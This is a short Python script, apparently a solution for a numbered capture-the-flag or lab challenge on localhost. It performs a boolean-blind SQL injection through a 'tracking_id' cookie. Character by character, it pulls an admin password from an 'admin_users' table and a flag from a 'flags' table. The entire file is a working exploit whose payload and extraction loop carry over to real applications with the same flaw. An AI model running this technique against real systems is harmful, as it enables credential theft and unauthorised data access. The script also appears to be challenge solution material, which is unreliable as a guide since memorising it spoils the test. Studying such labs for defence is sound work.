#!/usr/bin/env python3
"""SQLi-025: MySQL Boolean Blind via Cookie Exploit"""
import requests
import string

BASE_URL = "http://localhost:5025"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(cookie_val):
    r = requests.get(BASE_URL, cookies={"tracking_id": cookie_val}, timeout=10)
    return "Welcome back" in r.text

def extract(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            cookie = f"abc123xyz' AND SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{c}'-- -"
            if check(cookie):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-025: MySQL Cookie Blind Exploit")
    print("=" * 40)
    
    print("\n[*] Extracting admin password...")
    extract("admin_users", "password")
    
    print("\n[*] Extracting flag...")
    flag = extract("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
